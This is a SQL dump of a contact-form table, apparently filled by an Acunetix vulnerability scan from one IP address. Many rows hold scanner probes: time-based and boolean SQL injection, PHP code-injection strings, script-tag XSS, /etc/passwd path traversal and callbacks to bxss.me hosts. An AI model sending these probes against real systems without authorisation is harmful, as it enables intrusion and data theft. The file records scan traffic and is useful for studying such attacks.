INSERT INTO `tb_contact` VALUES (531, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (532, 'Acunetix cdrqeuat', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (533, '\';print(md5(acunetix_wvs_security_test));$a=\' wwkkomuf', '\';print(md5(acunetix_wvs_security_test));$a=\'', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (534, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (535, 'Acunetix cdrqeuat', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (536, '\";print(md5(acunetix_wvs_security_test));$a=\" wwkkomuf', '\";print(md5(acunetix_wvs_security_test));$a=\"', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (537, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (538, '${@print(md5(acunetix_wvs_security_test))} wwkkomuf', '${@print(md5(acunetix_wvs_security_test))}', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (539, ') pikysram', ')', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (540, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (541, 'Acunetix \'\"()', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (542, '${@print(md5(acunetix_wvs_security_test))}\\ wwkkomuf', '${@print(md5(acunetix_wvs_security_test))}\\', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (543, 'Acunetix budrowvm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (544, '!(()&&!|*|*| pikysram', '!(()&&!|*|*|', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (545, '(select(0)from(select(sleep(8.030000000000001)))v)/*\'+(select(0)from(select(sleep(8.030000000000001)', '(select(0)from(select(sleep(8.030000000000001)))v)/*\'+(select(0)from(select(sleep(8.030000000000001)', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (546, 'Acunetix wwkkomuf', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (547, 'Acunetix http://testasp.vulnweb.com/t/xss.html?%00.jpg', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (548, 'Acunetix frduhgsu', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (549, 'Acunetix budrowvm', 'Acunetix', '1', 'http://testasp.vulnweb.com/t/xss.html?%00.jpg', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (550, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (551, 'Acunetix cdrqeuat', 'Acunetix', '1', '\'\"()', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (552, 'Acunetix budrowvm', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (553, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (554, 'Acunetix wwkkomuf', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (555, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (556, 'Acunetix cdrqeuat', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (557, 'Acunetix wwkkomuf', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (558, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (559, 'Acunetix cdrqeuat', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (560, '^(#$!@#$)(()))****** pikysram', '^(#$!@#$)(()))******', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (561, 'pTc9L33u\'));select pg_sleep(12.045000000000001); -- jpkqpyml', 'pTc9L33u\'));select pg_sleep(12.045000000000001); --', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (562, 'Acunetix pikysram', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (563, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (564, 'Acunetix cdrqeuat', 'Acunetix', '\'\"()', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (565, 'Acunetix save', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (566, 'Acunetix dhlihkjr', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (567, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (568, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (569, 'Acunetix save', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (570, 'Acunetix pikysram', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (571, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (572, 'Acunetix save/.', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (573, 'Acunetix budrowvm', 'Acunetix', 'http://testasp.vulnweb.com/t/xss.html?%00.jpg', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (574, 'Acunetix pikysram', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (575, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (576, 'Acunetix wroaokte', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (577, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (578, 'Acunetix )', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (579, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (580, 'http://hit8tK14tMrK0.bxss.me/ dhlihkjr', 'http://hit8tK14tMrK0.bxss.me/', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (581, '))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) wroaokte', ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (582, 'Acunetix owtxrnaq', 'Acunetix', '1', 'save', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (583, 'Acunetix !(()&&!|*|*|', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (584, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (585, 'Acunetix owtxrnaq', 'Acunetix', '1', 'save', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (586, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (587, 'Acunetix ^(#$!@#$)(()))******', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (588, 'Acunetix wroaokte', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (589, 'Acunetix dhlihkjr', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (590, 'Acunetix owtxrnaq', 'Acunetix', '1', 'save/.', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (591, 'Acunetix pikysram', 'Acunetix', '1', ')', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (592, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (593, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (594, 'Acunetix )))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (595, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (596, 'Acunetix pikysram', 'Acunetix', '1', '!(()&&!|*|*|', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (597, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (598, 'Acunetix wroaokte', 'Acunetix', '1', ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (599, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (600, 'Acunetix pikysram', 'Acunetix', '1', '^(#$!@#$)(()))******', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (601, 'Acunetix http://hitgib33mPxCW.bxss.me/', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (602, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (603, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (604, 'Acunetix pikysram', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (605, 'Acunetix wroaokte', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (606, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (607, 'Acunetix wwkkomuf', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (608, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (609, 'Acunetix pikysram', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (610, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (611, 'Acunetix dhlihkjr', 'Acunetix', '1', 'http://hit0YSShYfU4b.bxss.me/', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (612, 'Acunetix wroaokte', 'Acunetix', ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (613, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (614, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (615, 'Acunetix pikysram', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (616, 'Acunetix owtxrnaq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (617, 'Acunetix tljmdcfx', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (618, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (619, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (620, 'Acunetix pikysram', 'Acunetix', ')', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (621, 'Acunetix owtxrnaq', 'Acunetix', 'save', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (622, 'www.acunetix.com tljmdcfx', 'www.acunetix.com', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (623, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (624, 'Acunetix dhlihkjr', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (625, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (626, 'Acunetix pikysram', 'Acunetix', '!(()&&!|*|*|', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (627, 'Acunetix owtxrnaq', 'Acunetix', 'save', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (628, 'Acunetix tljmdcfx', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (629, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (630, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (631, 'Acunetix owtxrnaq', 'Acunetix', 'save/.', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (632, 'Acunetix www.acunetix.com', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (633, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (634, 'Acunetix pikysram', 'Acunetix', '^(#$!@#$)(()))******', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (635, 'Acunetix ../../../../../../../../../../etc/passwd', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (636, 'Acunetix tljmdcfx', 'Acunetix', '1', 'www.acunetix.com', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (637, 'Acunetix dhlihkjr', 'Acunetix', 'http://hitCUqIMn3RoE.bxss.me/', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (638, 'Acunetix -1 OR 2+38-38-1=0+0+0+1 --', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (639, 'Acunetix caaaeljh', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (640, 'Acunetix ejvjmwyy', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (641, 'Acunetix ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (642, 'Acunetix caaaeljh', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (643, 'Acunetix tljmdcfx', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (644, 'Acunetix -1 OR 2+492-492-1=0+0+0+1', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (645, 'JyI= chwtolkc', 'JyI=', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (646, 'Acunetix ejvjmwyy', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (647, '\'\" chwtolkc', '\'\"', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (648, 'Acunetix ejvjmwyy', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (649, '\'\'\"\" chwtolkc', '\'\'\"\"', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (650, '(select convert(int,CHAR(65))) chwtolkc', '(select convert(int,CHAR(65)))', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (651, 'Acunetix ../../../../../../../../../../etc/passwd.jpg', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (652, 'Acunetix J2O6aRHQ\')); waitfor delay \'0:0:3\' --', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (653, 'Acunetix chwtolkc', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (654, 'Acunetix Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (655, 'Acunetix 1G7P75Gy\';select pg_sleep(3); --', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (656, 'Acunetix\'\"()&%<ScRiPt >prompt(985824)</ScRiPt> phgmwkeh', 'Acunetix\'\"()&%<ScRiPt >prompt(985824)</ScRiPt>', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (657, 'Acunetix chwtolkc', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (658, 'Acunetix ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (659, 'Acunetix js1PG5nF\');select pg_sleep(3); --', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (660, 'Acunetix chwtolkc', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (661, 'Acunetix /../..//../..//../..//../..//../..//etc/passwd.jpg', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (662, '\'\"()&%<ScRiPt >prompt(958204)</ScRiPt> phgmwkeh', '\'\"()&%<ScRiPt >prompt(958204)</ScRiPt>', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (663, 'Acunetix .\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (664, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (665, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (666, 'Acunetix_909892 phgmwkeh', 'Acunetix_909892', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (667, 'Acunetix oeefhgbu', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (668, 'Acunetix oeefhgbu', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (669, 'Acunetix jpkqpyml', 'Acunetix', '1', '-1\" OR 3+934-934-1=0+0+0+1 --', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (670, 'Acunetix jpkqpyml', 'Acunetix', '1', '-1\" OR 3*2<(0+5+934-934) --', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (671, 'Acunetix jpkqpyml', 'Acunetix', '1', '-1\" OR 2+1-1-1=1 AND 934=934 --', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (672, 'Acunetix jpkqpyml', 'Acunetix', '1', 'if(now()=sysdate(),sleep(3),0)/*\'XOR(if(now()=sysdate(),sleep(3),0))OR\'\"XOR(if(now()=sysdate(),sleep(3),0))OR\"*/', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (673, 'Acunetix chwtolkc', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (674, 'Acunetix \'\"()&%<ScRiPt >prompt(974845)</ScRiPt>', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (675, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (676, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (677, 'Acunetix cnekamwv', 'Acunetix', '1', '1\'\"()&%<ScRiPt >prompt(925013)</ScRiPt>', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (678, 'Acunetix cnekamwv', 'Acunetix', '1', '\'\"()&%<ScRiPt >prompt(953515)</ScRiPt>', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (679, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (680, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (681, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (682, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (683, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (684, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (685, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (686, 'Acunetix cnekamwv', 'Acunetix', '1', '1_923644', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (687, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (688, 'Acunetix uvbuilft', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (689, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (690, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (691, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (692, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (693, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (694, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (695, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (696, 'Acunetix uvbuilft', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (697, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (698, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (699, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (700, 'Acunetix jpkqpyml', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (701, 'Acunetix jpkqpyml', 'Acunetix', '-1 OR 2+664-664-1=0+0+0+1 --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (702, 'Acunetix uvbuilft', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (703, 'Acunetix jpkqpyml', 'Acunetix', '-1 OR 2+582-582-1=0+0+0+1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (704, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (705, 'Acunetix jpkqpyml', 'Acunetix', '-1\' OR 2+526-526-1=0+0+0+1 --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (706, 'Acunetix frrdbjag', 'Acunetix', '1\'\"()&%<ScRiPt >prompt(912068)</ScRiPt>', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (707, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (708, 'Acunetix jpkqpyml', 'Acunetix', '-1\" OR 2+698-698-1=0+0+0+1 --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (709, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (710, 'Acunetix jpkqpyml', 'Acunetix', 'if(now()=sysdate(),sleep(3),0)/*\'XOR(if(now()=sysdate(),sleep(3),0))OR\'\"XOR(if(now()=sysdate(),sleep', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (711, 'Acunetix frrdbjag', 'Acunetix', '\'\"()&%<ScRiPt >prompt(949126)</ScRiPt>', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (712, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (713, 'Acunetix jpkqpyml', 'Acunetix', '(select(0)from(select(sleep(3)))v)/*\'+(select(0)from(select(sleep(3)))v)+\'\"+(select(0)from(select(sl', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (714, 'Acunetix hkwhfhrq', 'Acunetix', '1', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (715, 'Acunetix jpkqpyml', 'Acunetix', '-1; waitfor delay \'0:0:6\' --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (716, 'Acunetix hkwhfhrq', 'Acunetix', '../../../../../../../../../../etc/passwd', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (717, 'Acunetix frrdbjag', 'Acunetix', '1_918337', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (718, 'Acunetix jpkqpyml', 'Acunetix', '-1); waitfor delay \'0:0:6\' --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (719, 'Acunetix hkwhfhrq', 'Acunetix', '../../../../../../../../../../etc/passwd.jpg', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (720, 'Acunetix jpkqpyml', 'Acunetix', '-1)); waitfor delay \'0:0:6\' --', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (721, 'Acunetix hkwhfhrq', 'Acunetix', 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (722, 'Acunetix hkwhfhrq', 'Acunetix', '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', '1', '110.136.26.106', '0000-00-00');
INSERT INTO `tb_contact` VALUES (723, 'Acunetix hkwhfhrq', 'Acunetix', '/../..//../..//../..//../..//../..//etc/passwd.jpg', '1', '110.136.26.106', '0000-00-00');
